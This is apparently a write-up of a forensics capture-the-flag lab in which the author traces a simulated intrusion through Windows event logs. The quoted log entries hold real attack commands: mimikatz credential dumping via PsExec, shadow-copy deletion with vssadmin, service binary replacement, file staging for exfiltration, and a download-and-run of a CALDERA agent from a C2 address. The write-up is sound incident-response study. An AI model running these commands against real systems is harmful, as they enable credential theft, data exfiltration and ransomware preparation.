# DikBek

## DFIR, 3000 points

### Description

Professor Jan Vogel has spent the last 6 months developing an early detection system for the Novid Virus. But, one week before the public launch of the Metaalbekkanarie, the confidential research which was set to make the South African government Billions of Randelas was published on Github by attackers.

How could this have happened? 

For more information, check the [DikBek scenario backstory](https://socvel.com/dikbek.html#DikBek).

Author: [SocVel](https://twitter.com/socveldotcom)

### Solution

For this lab, I will explain my investigation work regarding this hack. To break down this exercise, I will focus on interesting questions asked in this SocVel's challenge. Thus, some questions might be omitted.

Most of the logs for this challenge uses the `.evtx` extension which are logs managed by Windows Event Viewer, you can get more information on [this Forensics Wiki](https://forensicswiki.xyz/wiki/index.php?title=Windows_XML_Event_Log_%28EVTX%29) or [this LogRhythm documentation](https://docs.logrhythm.com/docs/devices/ms-windows-event-log-sources/ms-windows-event-logging-xml-windows-defender/malware-detection-events-xml-logs
). In order to deal with Windows Event Log files on my Linux operating system, I converted them into XML files with a Python script `evtx_dump.py`, available in my GitHub repository [there](https://github.com/exti0p/ctf/blob/master/2021/SocVel/DFIR/evtx_dump.py).

#### Q1) To start their attack on this host, the attackers appear to have downloaded an archive full of tools. Proxy logs for the host also showed activity for the URL “https://docs.microsoft.com/en-us/sysinternals/” in the timeframe of the attack. To which folder was this downloaded tool archive extracted to? Give your answer as: c:\folder\subfolder\

Let's get into the swing of this lab: as the attackers consulted some Sysinternals documentation, it is very likely that they downloaded something from the Sysinternals suite, hence from something like `sysinternals.com`. I used this string as my filter and found that interesting entry:

```bash
ScriptBlockText: [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };$web = (New-Object System.Net.WebClient);$result = $web.DownloadFile("http://download.sysinternals.com/files/PSTools.zip", "PSTools.zip");New-Item -ItemType "directory" C:\Windows\System32\PSTools -Force;Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "C:\Windows\System32\PSTools");
```

The latter reveals the tools `PSTools` and its extracted path.

#### Q5) It looks like the attackers attempted credential dumping on the host. Which common attacker tool was used by them to attempt this? 

Very quickly, I have my guesses: `lsass.exe` or `mimikatz` related stuff but I need to dig in. Let's get more information of known attacks with [this](https://attack.mitre.org/techniques/T1003/) famous MITRE ATT&CK documentation regarding credential dumping.

After trying a few sub-techniques, I discovered that LSA secrets were dumped. Though, this is the content of the extraction, not the tool used to do so. I looked up, with this new piece of information, in the logs, and got this entry:

```bash
"C:\Windows\System32\PSTools\PsExec.exe" /accepteula \\SAEBIA-DC1 -c c:\Windows\System32\mim\kanaries.exe "lsadump::lsa /inject /id:500" exit
```

The `mim` directory and [this GitHub wiki on mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump) led me to guess that `mimikatz` is the used tool. 

#### Q8) The attackers targeted another host on the network with credential dumping, by making use of remote process injection. Which tool did the attacker use to facilitate executing commands on a remote host?

My guess was that he used a tool from Sysinternals suite, thereby I took a quick look at [its documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) and searched for tools that seemed suspicious, such as `PsExec`. It turned out that it was the right guess after documenting myself a bit more with [this documentation](https://strontic.github.io/xcyclopedia/library/PsExec.exe-27304B246C7D5B4E149124D5F93C5B01.html).

#### Q15) Making use of the activities described by Mitre Att&ck Technique T1543.003, the attackers attempted to replace a service binary with another, potentially malicious file. What was the display name (not the service name) of the service who's binary was attempted to be replaced by the attackers?

Àfter understanding this technique, the attacker most likely used a service. For this, he probably fetched it with the cmdlet `Get-Service`, let's check if I find something relevant:

```bash
ScriptBlockText: $s = Get-Service -Name WSearch;if ($s.status -ne 'Stopped') { Stop-Service $s };$exe = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\WSearch").ImagePath.split()[0];$path = (Resolve-Path $exe).Path;Copy-Item -Path $path -Destination ($path + ".saved");Copy-Item -Path "C:\Windows\System32\f4ncyp0od13.exe" -Destination $path
```

Indeed, `WSearch` seems to be the requested service. Still, the **display name** is requested, not the service name. A quick [help from Google](https://www.google.com/search?q=%22WSearch%22+display+name&client=firefox-b-e&ei=1vnkYOXpC8msa47zsogO&oq=%22WSearch%22+display+name&gs_lcp=Cgdnd3Mtd2l6EAM6BwgAEEcQsANKBAhBGABQm4MBWIGHAWDQiAFoAXACeACAAYcBiAH3ApIBAzAuM5gBAKABAaoBB2d3cy13aXrIAQjAAQE&sclient=gws-wiz&ved=0ahUKEwjlrNKp3s_xAhVJ1hoKHY65DOEQ4dUDCA0&uact=5), and I knew that `WSearch` is the service name for `Windows Search`.

#### Q16) In their 2021 Threat Detection Report, Red Canary identified an activity cluster that deploys Monero cryptocurrency-mining payloads. This cluster made heavy use of T1543.003. Red Canary previously documented that one of the payloads used by this cluster wrote a specific log file to disk. This log file is said to contain the hardware details of an infected system. You’d like to look for this file in another incident you are working on. Assuming the log’s filename were to remain the same across infections, what filename would you be looking for? Give your answer as filename.extension

I found some more information in the Red Canary report which defines `Blue Mockingbird` as this activity cluster matching these requirements. I documented myself more with [this article](https://redcanary.com/blog/blue-mockingbird-cryptominer/) and found that, in the reverse engineering part with Ghidra static analysis, `tttx.log` is the log file name.

#### Q17) The attacker executed a command on the host that is a common precursor during a ransomware attack. What was the full command executed by the attacker?

I struggled on this one as I didn't think it through at first. I finally understood that this common precursor during a ransomware attack is to erase any kind of backup. This being said, I got to know the `vssadmin` tool which manages volume snapshot backups. You can get more information [there](https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin).

A bit of search with that information drew me to this entry:
```bash
C:\Windows\System32\PSTools\PsExec.exe "C:\Windows\System32\PSTools\PsExec.exe" \\localhost -accepteula vssadmin Delete Shadows /All
```

Which gave me the expected answer.

#### Q21) What was the name of the executable launched by the attackers while making use of the techniques described in Mitre Att&ck T1218.011. Give your answer as filename.exe

An overview of signed binary proxy execution with `rundll32.exe` is explained in [the associated documentation](https://attack.mitre.org/techniques/T1218/011/).

A search within Sysmon archive logs gave me the executable:
```xml
<Data Name="UtcTime">2021-05-06 17:27:59.311</Data>
<Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
<Data Name="Product">Microsoft&#174; Windows&#174; Operating System</Data>
<Data Name="CommandLine">"C:\Windows\system32\rundll32.exe" pcwutl.dll,LaunchApplication %%windir%%\System32\f4ncyp0od13.exe</Data>
<Data Name="User">WIN-HOST-374231\vagrant</Data>
```

#### Q22) Remaining with T1218.011, according to the Red Canary threat report, which trojan was seen being delivered as a DLL and then executed using Rundll32 ?

I cross matched the Red Canary report and [this french documentation](https://www.hameconnage.net/la-nouvelle-version-de-qbot-trojan-vole-presque-tout) which confirmed me that the `Qbot` trojan is delivered as a DLL and then executed using `rundll32.exe`. It is my answer then.

#### Q23) The attackers exfiltrated some very confidential data from the host. Which folder did they create and use as staging directory prior to archiving and exfiltrating the data? Give you answer in the following format c:\folder\subfolder\etc\

To extract some data, one have to copy some data into a folder. Thus, I searched for `mkdir`, `Copy-Item` and finally `cp` entries in PowerShell logs and finally, after some effort, I found this entry: 

```xml
<EventID Qualifiers="">4104</EventID>
<TimeCreated SystemTime="2021-05-06 17:31:56.769741"></TimeCreated>
<EventRecordID>22986</EventRecordID>
<Execution ProcessID="4064" ThreadID="4280"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>win-host-3742319</Computer>
<Data Name="ScriptBlockText">$files = Get-ChildItem C:\Users -Recurse -Include *.*x -ErrorAction 'SilentlyContinue'; foreach ($file in $files) { cp $file.FullName c:\Windows\System32\poodleout\ }</Data>
```

Which gave me the staging directory.

#### Q24) The attacker ran a command to copy confidential data over to their staging directory. This command however only targeted files with specific file extensions. Have a look at the attached file DikBek_File_Extensions.txt. Which file extensions in the attached txt file would have been included in the attacker's copy command? Provide the extensions as comma-delimited, in alphabetical order. i.e. .JAVA,.MTW,.ZIP

Remember the very last question, I have this command:
```bash
$files = Get-ChildItem C:\Users -Recurse -Include *.*x -ErrorAction 'SilentlyContinue';
```

I crafted a non perfect regex to insert into my favorite text editor **Sublime Text** which simply did what does this command: `.(.*)x$`. It matches file extensions with an `x` at the end of their extension, it is to grab all documents known with the Microsoft Office suite such as `.xlsx`, `docx` and so on.

Applied to my case here, it matched these extensions: `.DOCX`, `.PPTX` and `.XLSX`.

#### Q27) For the data exfiltration, the attackers specified a custom browser User Agent in the command used, likely in an attempt to bypass detection by security tooling. What is the name of the browser they configured the user agent string to look like? Provide just the browser name as your answer.

From the previous question, I had this information regarding the headers:
```bash
$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
```

Hence, the User-Agent header value is:
```bash
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
```

From that, I guessed that it was a Chrome instance. Still, to be sure of what I was about to write as an answer, I preferred to double check with [this User-Agent parser online](https://developers.whatismybrowser.com/useragents/parse/#parse-useragent). It outputted me `Chrome 60 on Windows 10`, which gave me my answer.

#### Q30) After pulling an all-nighter on the analysis of this system, you discover the following string in memory of the compromised host: 54ndc47. Previous experience tells you this means there is a very specific “infection” on the host which would've allowed the attackers to remotely run the powershell commands on it. What was the IP address where this potentially malicious piece of software was connecting back to (C2 Address)? Give just the IP address as your answer.

From this question, there is a relevant information to pick up, I hope you did notice it. It is the **string in memory of the compromised host**: `54ndc47`. What is this string, where does it come from ? If it was used during the attack, maybe it can lead me to a known pattern ? Let's Google it.

From that search, I found [this GitHub repository from MITRE](https://github.com/mitre/sandcat) which explains that it is a `CALDERA` plugin. I have more elements, I can refine my research, let's go! Then, I landed in [this documentation](https://caldera.readthedocs.io/en/latest/How-to-Build-Agents.html) which matches DikBek's attack pattern. I understood that the attacker used that `caldera` agent. Finally, I search with this keyword into PowerShell logs and got this entry:

```xml
<EventRecordID>22483</EventRecordID>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>win-host-3742319</Computer>
<Data Name="ScriptBlockText">
$url="http://10.0.1.12:8888/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$output="C:\Users\Public\sandcat.exe"
$wc.DownloadFile($url,$output)
C:\Users\Public\sandcat.exe -server http://10.0.1.12:8888 -group my_group -v
</Data>
<Data Name="Path">C:\caldera_agent.ps1</Data>
```

And final flag!